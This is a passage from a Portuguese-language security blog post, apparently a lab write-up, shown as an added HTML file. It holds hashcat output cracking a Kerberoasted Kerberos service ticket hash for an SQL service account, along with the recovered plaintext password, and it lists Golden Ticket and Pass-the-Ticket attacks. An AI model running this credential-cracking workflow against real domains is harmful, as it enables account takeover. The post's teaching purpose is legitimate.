+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Watchdog: Temperature abort trigger set to 90c
+
+Dictionary cache built:
+* Filename..: /home/tuxtrack/tools/wordlist/br-wordlist.txt
+* Passwords.: 73551
+* Bytes.....: 596942
+* Keyspace..: 73551
+* Runtime...: 0 secs
+
+$krb5tgs$23$*sqlserver$hnr.local$MSSQLSvc/SQL.hnr.local:1433*$b9aa930a4701972a30a499e63dc
+bf5bb$61c1e1610ac22090f167efc415053ced20a33f8c2eafa63d4273c01bd5bcb17915adfc5978900e52735
+a45fbee87cf87714eef994e0c7141727bde132b74090ba5689a7eb810dd36a7b4c9dca9bde985b4bfda061d4e
+79bec757efe5776b3b448928f691ada4d5823e667ac12c04036b7c59b4cc5d6c73c6b90c41a665b75fc1290b1
+24a237ff85755d8f32e16554355e376fad9c8bfbe148220a378a2a2c64f2636bce82640050826d1b70754d682
+eaa5ef239bd51422a7f47f92f979478407af84db5c4e750084d698a2a86726b38cd97a89e5996105cced2d5bc
+a96c08c839ec1129e71bbbd6bbe5072afeccd0a54a1bab854c5542183802a5ced29806de77615f9ce45d3dc5c
+00ee84c27104f46aa219f36103f4ffec0f2144d7d46ff2f9466b6bba33fff5cd353b8a236f6e972e62f707857
+1920320c8cf6279899c3304194e55dfa9053d5c3b6a67d122de88fab9475532643ba0ce5e3fdf3b2136439c33
+a722fc040aa9b04ca4c3033c2d766dfa76d9f43680d28f74aa7835df74523cf30fc633fb6e63b1ce48c855a8b
+5888ca3f054106e6c9aa7fb216ec32673e58091f587e86c2c84b82bcae0406a762b0fa0c5fa7c27245df3789b
+8920d876d2fa0c6ba762cf9e8c6ed754ddb67370073d761c4ab9e71140ce56ad0645050cd0e164812040a2b16
+d0649ca51b8b63518092a5d2810fc103cc1c7288f18c0e524fd2e050724e8b2b81fc957b704eb7b05f712f5bf
+ee43c46261a2f6c6204a6178c694f662d409452dd823fa92b2a2a5e2d9cb00410007ee832d7631b2a5b3744e8
+8409e4f4cf24b872d0c724d2733fa37b581cbfd18bf068f7518be633200e43fb38b32ecb1400bdf2f25c8190a
+55df5d126e2d60fb445e58ee82df35b5a36c1dbf7915a42eac048235144086c8e75694068e1fc1a619990a545
+1be5c7d9f1b3b3e21ed3a38c96c974dcd030cb5b4a7bd1c1fcfc91c75e0a025b4e965603251a319ee5e56706b
+ad97a827c2dff3403202e4dcb25618cb488e04193a80281bd64f96d6efb8c89285320cd3749ee651c5096a073
+3e39a2a603ea681ba0c423393f7326cdd2ee206f565f1084627e7d27db1327c4b1413858a372d377a412a1f70
+5b22dbe13ab6df19430c1a82b0678467c964982ad192d6e6a00f86115925c82e6a50d7cf35450b06283d1c51d
+02d926f23bf99b24eb5557f019720f1eb4c11cd4915aab29c0afb978c1233bda567381dc9ba6ccc84d7b7db27
+fd78a06b40da4acb6fc6094befbe6b18926ae821ee728347a4914bddda945c2947aced4a2a187b0357b9d5953
+f363462f0726f332b3761b112b540f1a01402e60dea0d0485f36194ae17d8cfec6acb6229efee662d4187f710
+2393488d31ff6a5d4c40262274fb4a5ea1c7d76638c0b1ba82f62c841de519e0a2955b82eea2f70fae5dd30ec
+007130caed823aa6f84fa97c227347a871dceefaa4d0860a82151c0a049b52332c550732c95a7c7ed54c0aa6a
+1033831a4598b6bd0069b34e6bfd11ecc5ec8dca0a0e9d89dda1d3056e240beeaa98ce0645aeb105194382fb0
+68e2ccb:P@$sword
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: Kerberos 5 TGS-REP etype 23
+Hash.Target......: $krb5tgs$23$*sqlserver$hnr.local$MSSQLSvc/SQL.hnr.l...8e2ccb
+Time.Started.....: Thu Feb 13 11:07:38 2020 (0 secs)
+Time.Estimated...: Thu Feb 13 11:07:38 2020 (0 secs)
+Guess.Base.......: File (/home/tuxtrack/tools/wordlist/br-wordlist.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   716.3 kH/s (9.92ms) @ Accel:256 Loops:1 Thr:64 Vec:1
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.........: 73551/73551 (100.00%)
+Rejected.........: 0/73551 (0.00%)
+Restore.Point....: 0/73551 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: Aarao -&gt; integros
+Hardware.Mon.#1..: Temp: 49c Util: 33% Core:1019MHz Mem:2505MHz Bus:16
+
+Started: Thu Feb 13 11:07:28 2020
+Stopped: Thu Feb 13 11:07:39 2020
+</code></pre></div></div>
+
+<p>Lista de SPN’s: <a href="https://adsecurity.org/?page_id=183">https://adsecurity.org/?page_id=183</a></p>
+
+<h2 id="golden-ticket">Golden Ticket</h2>
+<ul>
+  <li>Silver Ticket</li>
+  <li>Over Pass The Hash</li>
+  <li>Pass The Ticket</li>
+</ul>
+
+<p>Espero ter coragem para escrever sobre como funcionam os ataques nos próximos posts.</p>
+
+<p>References:</p>
+
+<p><a href="https://social.technet.microsoft.com/wiki/contents/articles/4209.kerberos-survival-guide.aspx">Kerberos Survival Guide</a></p>
+
+  </div>
+
+  <div class="date">
+    Written on February  9, 2020
+  </div>
+
+  
+</article>
+
+    </div>
+
+    <div class="wrapper-footer">
+      <div class="container">
+        <footer class="footer">
+          
+<a href="mailto:tuxtrack@hacknroll.com"><i class="svg-icon email"></i></a>
+
+
+<a href="https://github.com/tuxtrack"><i class="svg-icon github"></i></a>
+<a href="https://instagram.com/elbert_cirino"><i class="svg-icon instagram"></i></a>
+
+
+
+
+
+
+
+        </footer>
+      </div>
+    </div>
+
+    
+
+  </body>
+</html>
